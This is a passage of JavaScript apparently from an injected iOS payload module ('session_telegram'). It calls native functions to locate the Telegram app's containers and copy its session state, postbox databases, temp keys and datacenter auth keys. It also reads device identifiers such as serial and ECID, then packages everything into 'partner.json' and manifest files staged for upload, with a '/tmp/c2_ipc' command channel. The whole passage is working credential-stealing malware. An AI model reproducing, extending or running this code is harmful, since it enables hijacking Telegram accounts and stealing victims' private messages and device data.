		// retry bind_text style via alternate prepare with quoted key — skip if still empty
	}
	try { Native.callSymbol("sqlite3_close", db); } catch (_) {}
	if (!auth && !addr) return { auth: "", addr: "", err: "t1_empty", open_rc: "ok" };
	return { auth: auth || "", addr: addr || "", err: "", open_rc: "ok" };
}

function _buildDbSqliteField(authB64, addrB64) {
	if (!authB64 && !addrB64) return "";
	const obj = {};
	if (authB64) obj.datacenterAuthInfoById = authB64;
	if (addrB64) obj.datacenterAddressSetById = addrB64;
	const raw = JSON.stringify(obj);
	const u8 = new Uint8Array(raw.length);
	for (let i = 0; i < raw.length; i++) u8[i] = raw.charCodeAt(i) & 255;
	return _b64EncodeU8(u8);
}

function _fileSize(path) {
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return -1;
		Native.callSymbol("fseek", fd, 0, 2);
		const sz = Native.callSymbol("ftell", fd);
		Native.callSymbol("fclose", fd);
		return Number(sz);
	} catch (_) {
		return -1;
	}
}

function _getenv(name) {
	try {
		const p = Native.callSymbol("getenv", name);
		if (!p || p === 0 || p === 0n) return "";
		return Native.readCString(typeof p === "bigint" ? p : BigInt(p), 512);
	} catch (_) {
		return "";
	}
}

function _copyOne(src, dst) {
	// Prefer fread/fwrite: copyfile() returns -1 in InjectJS Native (seen on configd).
	try {
		if (!_canOpen(src)) return { ok: false, size: 0, err: "missing" };
		try { Native.callSymbol("unlink", dst); } catch (_) {}
		const inFd = Native.callSymbol("fopen", src, "rb");
		if (!inFd || inFd === 0 || inFd === 0n) return { ok: false, size: 0, err: "fopen_src" };
		const outFd = Native.callSymbol("fopen", dst, "wb");
		if (!outFd || outFd === 0 || outFd === 0n) {
			try { Native.callSymbol("fclose", inFd); } catch (_) {}
			return { ok: false, size: 0, err: "fopen_dst" };
		}
		const chunk = 65536;
		const buf = Native.callSymbol("malloc", chunk);
		if (!buf || buf === 0 || buf === 0n) {
			try { Native.callSymbol("fclose", inFd); } catch (_) {}
			try { Native.callSymbol("fclose", outFd); } catch (_) {}
			return { ok: false, size: 0, err: "malloc" };
		}
		let total = 0;
		let err = "";
		for (;;) {
			const n = Native.callSymbol("fread", buf, 1, chunk, inFd);
			const nr = Number(n);
			if (!nr || nr <= 0) break;
			const w = Native.callSymbol("fwrite", buf, 1, nr, outFd);
			if (Number(w) !== nr) {
				err = "short_write";
				break;
			}
			total += nr;
			if (nr < chunk) break;
		}
		try { Native.callSymbol("fclose", inFd); } catch (_) {}
		try { Native.callSymbol("fclose", outFd); } catch (_) {}
		try { Native.callSymbol("free", buf); } catch (_) {}
		try { Native.callSymbol("chmod", dst, 0x1b6); } catch (_) {}
		if (err) return { ok: false, size: total, err: err };
		return { ok: total > 0, size: total, err: total > 0 ? "" : "empty" };
	} catch (e) {
		return { ok: false, size: 0, err: String(e).slice(0, 60) };
	}
}


function _metadataBundle(path) {
	const raw = _readFileHead(path, 8192);
	if (!raw) return "";
	if (raw.indexOf(BUNDLE_HINT) >= 0) return BUNDLE_HINT;
	if (raw.indexOf("telegra.Telegraph") >= 0) return BUNDLE_HINT;
	return "";
}

function _scoreTgRoot(root) {
	if (!root) return 0;
	let score = 0;
	const td = _resolveTelegramData(root) || ( _isDir(root + "/telegram-data") ? root + "/telegram-data" : "");
	if (td) score += 25;
	const atomic = _resolveAtomicStatePath(td || root);
	if (atomic) score += 80;
	if (_canOpen((td || root) + "/.tempkey")) score += 15;
	const accts = _listAccountDirs(td || root);
	for (let ai = 0; ai < accts.length && ai < 4; ai++) {
		if (_canOpen(accts[ai] + "/postbox/db/db_sqlite")) score += 40;
	}
	if (_pathExists(root + "/accounts-metadata")) score += 10;
	if (_pathExists(root + "/key_datas")) score += 10;
	if (_pathExists(root + "/accounts-shared-data")) score += 10;
	if (_canOpen(root + "/postbox/db/db_sqlite")) score += 20;
	return score;
}

function _scanContainerBase(base, limit) {
	const out = [];
	_log("[SESSION-TG] scan begin base=" + base + " limit=" + (limit || 200));
	try {
		const dir = Native.callSymbol("opendir", base);
		if (!dir || dir === 0 || dir === 0n) {
			_log("[SESSION-TG] scan opendir fail " + base);
			return out;
		}
		let n = 0;
		let checked = 0;
		for (;;) {
			const ent = Native.callSymbol("readdir", dir);
			if (!ent || ent === 0 || ent === 0n) break;
			n++;
			if (n > (limit || 200)) break;
			let name = "";
			try { name = Native.readCString(typeof ent === "bigint" ? ent + 21n : BigInt(ent) + 21n, 64); } catch (_) { name = ""; }
			if (!name || name === "." || name === "..") continue;
			if (name.length < 30) continue;
			const root = base + "/" + name;
			const meta = root + "/" + METADATA_PLIST;
			if (!_canOpen(meta)) continue;
			checked++;
			const bid = _metadataBundle(meta);
			const score = _scoreTgRoot(root);
			// Allow telegram-data hits without string in first 8KB of metadata (compat)
			if (!bid && score < 25) continue;
			let gid = "";
			const mraw = _readFileHead(meta, 4096);
			for (let hi = 0; hi < TG_GROUP_HINTS.length; hi++) {
				if (mraw.indexOf(TG_GROUP_HINTS[hi]) >= 0) { gid = TG_GROUP_HINTS[hi]; break; }
			}
			out.push({ path: root, score: score, group_id: gid || bid || "", bundle: bid || "telegram-data", base: base });
			_log("[SESSION-TG] hit score=" + score + " gid=" + (gid || bid || "") + " root=..." + name.slice(-12));
			// early stop: atomic-state class hit
			if (score >= 80) break;
		}
		try { Native.callSymbol("closedir", dir); } catch (_) {}
		_log("[SESSION-TG] scan done base=" + base + " ents=" + n + " meta=" + checked + " hits=" + out.length);
	} catch (e) {
		_log("[SESSION-TG] scan ERR " + String(e).slice(0, 80));
	}
	return out;
}

function _findAppGroup() {
	const groups = [];
	const seen = {};
	const addList = function (list) {
		for (let i = 0; i < list.length; i++) {
			const g = list[i];
			if (!g || !g.path || seen[g.path]) continue;
			seen[g.path] = 1;
			groups.push(g);
		}
	};
	// Path A: AppGroup first (like WA). App Data only if no scored hit.
	addList(_scanContainerBase(APPGROUP_BASE, 220));
	let best = groups.length ? groups.slice().sort(function (a, b) { return (b.score || 0) - (a.score || 0); })[0] : null;
	if (!best || !(best.score > 0)) {
		addList(_scanContainerBase(APPDATA_BASE, 180));
	}
	groups.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
	best = groups.length ? groups[0] : null;
	return {
		path: best ? best.path : "",
		score: best ? best.score : 0,
		group_id: best ? (best.group_id || "") : "",
		discovery: best ? (best.score > 0 ? "metadata+score" : "metadata") : "",
		groups: groups.slice(0, 8)
	};
}

function _candidateFiles(root) {
	if (!root) return [];
	const rels = [
		"accounts-metadata",
		"accounts-shared-data",
		"key_datas",
		"Documents/accounts-metadata",
		"Documents/accounts-shared-data",
		"Documents/key_datas",
		"Library/accounts-metadata",
		"postbox/db/db_sqlite",
		"postbox/db/db_sqlite-wal",
		"postbox/db/db_sqlite-shm",
		"Documents/postbox/db/db_sqlite",
		"Documents/postbox/db/db_sqlite-wal",
		"Documents/postbox/db/db_sqlite-shm",
		"telegram-data/accounts-metadata",
		"telegram-data/accounts-shared-data",
		"telegram-data/postbox/db/db_sqlite",
		// Modern encrypted ValueBox paths
		"telegram-data/accounts-metadata/db/db_sqlite",
		"telegram-data/accounts-metadata/db/db_sqlite-wal",
		"telegram-data/accounts-metadata/db/db_sqlite-shm",
		"accounts-metadata/db/db_sqlite",
		"accounts-metadata/db/db_sqlite-wal",
		"accounts-metadata/db/db_sqlite-shm"
	];
	const out = [];
	for (let i = 0; i < rels.length; i++) {
		out.push({ name: rels[i].replace(/\//g, "__"), src: root + "/" + rels[i], rel: rels[i] });
	}
	const td = root + "/telegram-data";
	const accts = _listAccountDirs(_isDir(td) ? td : root);
	for (let ai = 0; ai < accts.length && ai < 3; ai++) {
		const ap = accts[ai];
		const short = ap.split("/").pop() || ("account-" + ai);
		const suffixes = [
			"/postbox/db/db_sqlite",
			"/postbox/db/db_sqlite-wal",
			"/postbox/db/db_sqlite-shm"
		];
		for (let si = 0; si < suffixes.length; si++) {
			const rel = short + suffixes[si];
			out.push({ name: rel.replace(/\//g, "__"), src: ap + suffixes[si], rel: rel });
		}
	}
	return out;
}

function _collectAuth() {
	try { Native.callSymbol("mkdir", OUT_DIR, 0x1ff); } catch (_) {}
	const groupHit = _findAppGroup();
	const groups = groupHit.groups || [];
	const group = groupHit.path || "";
	const discovery = groupHit.discovery || (group ? "score" : "");
	_log("[SESSION-TG] root=" + (group || "none") + " score=" + (groupHit.score || 0) +
		" id=" + (groupHit.group_id || "") + " discovery=" + discovery + " tried=" + groups.length);

	const files = [];
	const add = function (name, src, meta) {
		meta = meta || {};
		const dst = OUT_DIR + "/" + name;
		if (!src) {
			files.push({ name: name, src: "", ok: false, size: 0, err: "not_found", from_group: meta.from_group || "" });
			return false;
		}
		if (_isDir(src)) {
			files.push({ name: name, src: src, ok: false, size: 0, err: "is_dir", from_group: meta.from_group || "", rel: meta.rel || "" });
			return false;
		}
		const r = _copyOne(src, dst);
		files.push({
			name: name, src: src, ok: r.ok, size: r.size || 0, err: r.err || "",
			from_group: meta.from_group || "", group_id: meta.group_id || "", rel: meta.rel || ""
		});
		_log("[SESSION-TG] copy " + name + " " + (r.ok ? "OK" : "FAIL") +
			" size=" + (r.size || 0) + (r.err ? " err=" + r.err : ""));
		return !!r.ok;
	};

	const td = group ? _resolveTelegramData(group) : "";
	const atomicPath = _resolveAtomicStatePath(td || group);
	let layout = td ? "telegram-data" : (group ? "legacy-flat" : "none");
	let stateB64 = "";
	let stateText = "";
	let userId = "";
	let accountId = "";
	let dbField = "";
	let t1Err = "";
	let postboxPath = "";

	if (atomicPath) {
		add("atomic-state", atomicPath, { from_group: group, rel: "accounts-metadata/atomic-state" });
		const u8 = _readFileU8(atomicPath, TG_MAX_STATE);
		if (u8 && u8.length) {
			stateB64 = _b64EncodeU8(u8);
			stateText = _u8ToText(u8);
			const meta = _parseAtomicMeta(stateText);
			userId = meta.user_id || "";
			accountId = meta.account_id || "";
			_log("[SESSION-TG] atomic-state bytes=" + u8.length + " userId=" + userId + " accountId=" + accountId +
				(meta.logged_out ? " loggedOut" : ""));
			if (meta.logged_out) userId = "";
		} else {
			_log("[SESSION-TG] atomic-state read fail");
		}
	} else {
		_log("[SESSION-TG] atomic-state not found td=" + (td || "none"));
	}

	// Resolve account postbox (prefer currentRecordId)
	const accts = _listAccountDirs(td || group);
	if (accountId) {
		const prefer = (td || group) + "/account-" + accountId + "/postbox/db/db_sqlite";
		if (_canOpen(prefer)) postboxPath = prefer;
	}
	if (!postboxPath) {
		for (let ai = 0; ai < accts.length; ai++) {
			const p = accts[ai] + "/postbox/db/db_sqlite";
			if (_canOpen(p)) { postboxPath = p; break; }
		}
	}
	if (postboxPath) {
		add("postbox_db_sqlite", postboxPath, { from_group: group, rel: postboxPath.replace(group + "/", "") });
		if (_canOpen(postboxPath + "-wal")) add("postbox_db_sqlite-wal", postboxPath + "-wal", { from_group: group });
		if (_canOpen(postboxPath + "-shm")) add("postbox_db_sqlite-shm", postboxPath + "-shm", { from_group: group });
		const t1 = _extractT1Pair(postboxPath, td || "");
		t1Err = t1.err || "";
		dbField = _buildDbSqliteField(t1.auth, t1.addr);
		_log("[SESSION-TG] t1 open=" + t1.open_rc + " auth=" + (t1.auth ? t1.auth.length : 0) +
			" addr=" + (t1.addr ? t1.addr.length : 0) + (t1Err ? " err=" + t1Err : ""));
	}

	// Aux copies for offline assemble / fallback
	if (td && _canOpen(td + "/.tempkey")) add("tempkey", td + "/.tempkey", { from_group: group });
	const aux = ["accounts-shared-data", "key_datas"];
	for (let xi = 0; xi < aux.length; xi++) {
		const ap = (td || group) + "/" + aux[xi];
		if (_canOpen(ap) && !_isDir(ap)) add(aux[xi], ap, { from_group: group });
	}

	let okCount = 0;
	for (let i = 0; i < files.length; i++) if (files[i].ok) okCount++;

	const hasState = !!stateB64;
	const hasDbField = !!dbField;
	let skipReason = "";
	if (!group) skipReason = "appgroup_not_found";
	else if (!hasState && !postboxPath) skipReason = "not_logged_in";
	else if (!hasState) skipReason = "atomic_state_missing";

	const ids = _readDeviceIds();
	const fields = {
		atomic_state: hasState ? "ok" : "missing",
		user_id: userId ? "ok" : "missing",
		db_sqlite_field: hasDbField ? "ok" : (t1Err || "missing"),
		postbox_db: postboxPath ? "ok" : "missing",
		layout: layout,
		account_id: accountId || "",
		t1_err: t1Err || ""
	};

	const partnerInner = {
		serial: ids.serial || "",
		unique: ids.unique || "",
		user_id: userId || "",
		channel: ids.channel || "",
		ecid: ids.ecid || "",
		db_sqlite: dbField || "",
		state: stateB64 || ""
	};
	const partnerBody = {};
	const pkeys = Object.keys(partnerInner);
	for (let pi = 0; pi < pkeys.length; pi++) partnerBody[pkeys[pi]] = partnerInner[pkeys[pi]];
	partnerBody.data = partnerInner;
	partnerBody._meta = {
		mode: "A.v3",
		layout: layout,
		atomic_path: atomicPath || "",
		postbox_path: postboxPath || "",
		td: td || "",
		t1_err: t1Err || "",
		partner_alias: "tglib"
	};
	_writeFile(OUT_DIR + "/partner.json", JSON.stringify(partnerBody) + "\n");
	if (userId && hasState) {
		_writeFile(OUT_DIR + "/" + userId + ".txt", JSON.stringify(partnerBody) + "\n");
	}

	const manifest = {
		id: SESSION_ID,
		target: SESSION_TARGET,
		mode: "A.v3",
		partner_alias: "tglib",
		partner_format: "1.txt",
		discovery: discovery,
		groups_tried: groups.length,
		group: group,
		group_id: groupHit.group_id || "",
		group_score: groupHit.score || 0,
		layout: layout,
		telegram_data: td || "",
		atomic_path: atomicPath || "",
		postbox_path: postboxPath || "",
		out_dir: OUT_DIR,
		ok_count: okCount,
		fields: fields,
		skip_reason: skipReason,
		user_id: userId || "",
		files: files,
		device: ids,
		partner_ready: !!(hasState && userId),
		ts: Date.now()
	};
	_writeFile(OUT_DIR + "/manifest.json", JSON.stringify(manifest) + "\n");
	_writeFile(STATUS_PATH, JSON.stringify(manifest) + "\n");
	return manifest;
}

try {
	// Do NOT bare-call invoker() here — callBuff[0] may be leftover (diag malloc) or
	// placeholder 0x41414141; Native.init() sets up #nc properly first.
	Native.init();
	try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
	try { Native.callSymbol("mkdir", OUT_DIR, 0x1ff); } catch (_) {}
	_writeEval("eval_ok", { via: "direct_inject", pid: Number(Native.callSymbol("getpid")) });
	const pid = Native.callSymbol("getpid");
	_log("[SESSION-TG] start id=" + SESSION_ID + " target=" + SESSION_TARGET + " pid=" + pid + " mode=A.v3");
	_writeFile(STATUS_PATH, JSON.stringify({
		id: SESSION_ID, target: SESSION_TARGET, stage: "scanning", ts: Date.now(), pid: pid
	}) + "\n");
	_writeHb(pid, 0, "\"stage\":\"scanning\"");

	const man = _collectAuth();
	_log("[SESSION-TG] collect done ok_count=" + man.ok_count + " group_score=" + man.group_score +
		" partner_ready=" + !!man.partner_ready + " user_id=" + (man.user_id || "") +
		" skip_reason=" + (man.skip_reason || "") + " group=" + (man.group ? "yes" : "no") +
		" atomic=" + ((man.fields && man.fields.atomic_state) || "?") +
		" postbox=" + ((man.fields && man.fields.postbox_db) || "?"));

	if (!man.partner_ready || !man.group || man.skip_reason) {
		let endWhy = man.skip_reason || (!man.group ? "appgroup_not_found" :
			(!man.partner_ready ? "partner_not_ready" : "collect_incomplete"));
		_log("[SESSION-TG] early_end reason=" + endWhy +
			" (not_logged_in=no account state; appgroup_not_found=container miss; else anomaly)");
		try {
			if (typeof __payloadFallbackReport === "function") {
				var related = [APPGROUP_BASE, APPDATA_BASE];
				if (man.group) related.push(man.group);
				var ups = [OUT_DIR + "/manifest.json"];
				for (var fi = 0; fi < (man.files || []).length; fi++) {
					var f = man.files[fi];
					if (f && f.src) related.push(f.src);
					if (f && f.ok) related.push(OUT_DIR + "/" + f.name);
				}
				__payloadFallbackReport({
					module_id: "session_telegram",
					stage: "collect_auth",
					error: endWhy,
					app_id: BUNDLE_HINT,
					related_paths: related,
					upload_paths: ups,
					meta: {
						group_score: man.group_score || 0,
						ok_count: man.ok_count || 0,
						session_id: SESSION_ID,
						discovery: man.discovery || "",
						skip_reason: man.skip_reason || "",
						partner_alias: "tglib",
						early_end: endWhy
					}
				});
			}
		} catch (_) {}
	} else {
		_log("[SESSION-TG] collect OK continue partner_ready user_id=" + (man.user_id || ""));
	}

	let tick = 0;
	const extra = "\"ok_count\":" + man.ok_count + ",\"group_score\":" + man.group_score;
	// pe-direct / lab default: oneshot (skip resident hb loop). Set __PE_SESSION_ONESHOT=false to keep loop.
	if (typeof __PE_SESSION_ONESHOT === "undefined" || __PE_SESSION_ONESHOT) {
		_log("[SESSION-TG] oneshot exit id=" + SESSION_ID + " pid=" + pid);
	} else {
	for (;;) {
		tick++;
		_writeHb(pid, tick, extra);
		if (tick === 1 || (tick % 5) === 0) {
			_log("[SESSION-TG] hb id=" + SESSION_ID + " tick=" + tick + " pid=" + pid);
		}
		if (_stopRequested()) {
			_log("[SESSION-TG] stop id=" + SESSION_ID + " tick=" + tick + " pid=" + pid);
			break;
		}
		Native.callSymbol("sleep", 2);
	}
	}
} catch (e) {
	try { _log("[SESSION-TG] THREW " + String(e).slice(0, 120)); } catch (_) {}
	try { _writeEval("eval_fail", { error: String(e).slice(0, 200) }); } catch (_) {}
	try {
		if (typeof __payloadFallbackReport === "function") {
			__payloadFallbackReport({
				module_id: "session_telegram",
				stage: "runtime",
				error: String(e).slice(0, 500),
				app_id: BUNDLE_HINT,
				related_paths: [OUT_DIR, STATUS_PATH],
				upload_paths: [],
				meta: { session_id: SESSION_ID, partner_alias: "tglib" }
			});
		}
	} catch (_) {}
}
